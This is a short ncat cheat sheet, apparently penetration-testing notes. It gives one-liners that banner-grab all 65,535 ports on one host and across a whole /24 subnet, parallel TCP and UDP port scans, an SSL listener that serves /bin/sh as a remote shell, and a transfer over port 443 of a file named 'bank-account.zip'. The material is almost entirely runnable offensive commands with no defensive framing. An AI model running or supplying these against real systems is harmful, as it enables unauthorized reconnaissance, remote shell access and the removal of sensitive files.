# ncat

## Scanning&#x20;

### banner grab

```
apt install ncat

for port in {1..65535}; do echo "" | ncat -vvn 192.168.56.170 $port 2>&1 | grep "READ SUCCESS for EID " | grep -v "peer unspecified" | cut -d ":" -f 3-  ; done
```

### banner grab the whole subnet

```
apt install ncat

for hosts in {1..254}; do for ports in {1..65535}; do echo "" | ncat -vvn 192.168.1.$hosts $ports 2>&1 | grep "READ SUCCESS for EID " | grep -v "peer unspecified" ; done ;done
```

### port scanner

```
tcp scan:
parallel ncat -nvz [host] ::: {1..65535}  2>&1 | grep "Connected"

udp scan:
parallel ncat -nvuz [host] ::: {1..65535}  2>&1 | grep "Connected"
```

## SSL connection

```
listener: nc --ssl -nvlp [local port] -e /bin/sh
client: nc --ssl localhost [remote port]
```

## FTP

```
nc -l -p 443 < C:\bank-account.zip --from machine that has the file, this one is windows.

nc -w3 192.168.31.201 443 > C:\bank-account.zip
```
